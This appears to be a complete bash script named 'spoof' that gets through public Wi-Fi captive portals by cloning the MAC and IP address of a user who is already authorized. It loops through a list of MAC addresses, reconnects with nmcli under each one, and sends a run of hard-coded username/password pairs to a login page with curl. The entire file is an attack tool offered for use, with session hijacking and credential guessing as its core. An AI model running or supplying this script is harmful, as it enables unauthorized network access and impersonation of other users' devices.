#!/usr/bin/bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
killall spoof

defaultiface="wlan0"
defaultssid="Android_WIF1"
# =========================================================================== #
#           FILE:  spoof                                                      #
#          USAGE:  sudo spoof	           	                              #
#                                                                             #
#    DESCRIPTION:  This script helps to pass through the captive portals in   #
#                  public Wi-Fi networks. It hijacks IP and MAC from somebody #
#                  who is already connected and authorized on captive portal. #
#   REQUIREMENTS:  coreutils, nmtui  	                                      #
#          NOTES:  Let the information always be free!                        #
#         AUTHOR:  jalilkhoironi  <@systematicat>		              #
#        VERSION:  1.0                                                        #
#        CREATED:  16.12.2016 - 23:59                                         #
#       REVISION:  ---                                                        #
#      COPYRIGHT:  2021 Stanislav "systematicat" Kotivetc                     #
#        LICENSE:  WTFPL v2                                                   #
# =========================================================================== #


## Check for running as root.
function root() {
	if ! [ $(id -u) = 0 ]; then
	 echo "The script need to be run as root." >&2
	 exit 0
	fi
}


## Find the initial parameters of wireless interface.
function device() {
interface="$(ip -o -4 route show to default | awk '/dev/ {print $5}' | awk '{print $1}')" 
wifissid="$(iw dev "$interface" link | awk '/SSID/ {print $NF}')" 
MAC="/bin/maclist.txt"
}

device >/dev/null

clear
if [[ "$interface" = $(echo) ]]; then
 interface="$defaultiface"
 wifissid="$defaultssid"
	toilet $(echo "MacSpoof")
	echo " # Using default interface" "$defaultiface" "?"
        echo " # And Wifi SSID" "$wifissid" "?"
	echo " Press any Key to continue or CTRL + Z to cancel and CTRL + C to change "
	read
else
        toilet $(echo "MacSpoof")
	echo " # Using interface" "$interface" "?"
	echo " # And Wifi SSID" "$wifissid" "?"
        echo " Press any Key to continue or CTRL + C to cancel"
	read
fi

## Option  parameters of wireless interface.
while getopts ":i:c:f:" OPTION
do
  case $OPTION in
    i)
      interface="$OPTARG";;
    c)
      wifissid="$OPTARG";;
    f)
      MAC="$OPTARG";;
  esac
done

## Find status of wireless interface.
function load() {
	localip="$(ip -o -4 route get 1 | awk '/src/ {print $7}')"
	gateway="$(ip -o -4 route show to default | awk '/via/ {print $3}')"
	broadcast="$(ip -o -4 addr show dev "$interface" | awk '/brd/ {print $6}')"
	macaddress="$(ip -0 addr show dev $interface \
	| awk '/link/ && /ether/ {print $2}' \
	| tr '[:upper:]' '[:lower:]')"
	dns="$(nslookup "$gateway" | grep -i "name =" | awk '{print $4}')"
	status="OFFLINE"
	download="$(ifconfig "$interface" | grep -i 'RX packets'| awk '/RX/ {print $6 $7}')"
	upload="$(ifconfig "$interface" | grep -i 'TX packets'| awk '/TX/ {print $6 $7}')"
	id="$(curl "$gateway"/status -s | awk '/Member/{print $137}'| cut -d ">"  -f 2| cut -d "<" -f 1)"

}

## Status connection network

function status() {
clear
echo "                       "$status"                        "
echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
echo "Interface         :" "$interface"
echo "Wifi SSID         :" "$wifissid"
echo "ID Member	  :" "$id"
echo "DNS Server        :" "$dns"
echo "Gateway           :" "$gateway"
echo "IP address        :" "$localip"
echo "MAC address       :" "$macaddress"
echo "Date              :" $(date)
echo ""
echo "Status ~"
}

## IF connection offline/online
function online() {
                status="ONLINE"
printf '%s\n' "$(clear ; status)"
                echo "		Download " "$download"
                echo "         	Upload	 " "$upload"
}
function offline() {
printf '%s\n' "$(clear ; status)"
                nmcli connection down "$wifissid" >/dev/null 
                echo "Koneksi terputus"
                nmcli connection modify "$wifissid" wifi.cloned-mac-address $M  >/dev/null
                echo "Menyambungkan koneksi ......"
                nmcli connection up "$wifissid" >/dev/null
		relogin >/dev/null
}

## Test internet access
function check() {
ping -c1 -w10 8.8.8.8 >/dev/null
      if [[ $? -eq 0 ]]; then

		online
	else
		offline
	fi
}

# Use Ctrl + C to force change mac again
control_c() {
#	nmcli connection up "$wifissid"
	offline
	trap 0
}

## Relogin in userpage
function relogin() {
		         		 
curl --data "username=ndaa&password=ndaa" aysila.net/login.html --connect-timeout 1 --silent  
curl --data "username=ayah&password=ayah" aysila.net/login.html --connect-timeout 1 --silent
curl --data "username=bunda&password=bunda" aysila.net/login.html --connect-timeout 1 --silent
curl --data "username=dede&password=dede" aysila.net/login.html --connect-timeout 1 --silent
curl --data "username=aysila&password=aysila" aysila.net/login.html --connect-timeout 1 --silent
curl --data "username=aysila1&password=aysila1" aysila.net/login.html --connect-timeout 1 --silent
curl --data "username=user1&password=user1" aysila.net/login.html --connect-timeout 1 --silent
curl --data "username=user2&password=user2" aysila.net/login.html --connect-timeout 1  --silent
curl --data "username=sila&password=sila" aysila.net/login.html --connect-timeout 1 --silent

}

## Change Mac for changing
function change() {
        for M in $(<$MAC)
        do
		if [[ "${M:0:1}" != "#" ]]
		then
 			trap control_c SIGINT
			sleep 1
			load >/dev/null
			check
		fi
	done
}

## Main and Looping
function main() {
while :
do
	change
done
}




root
main
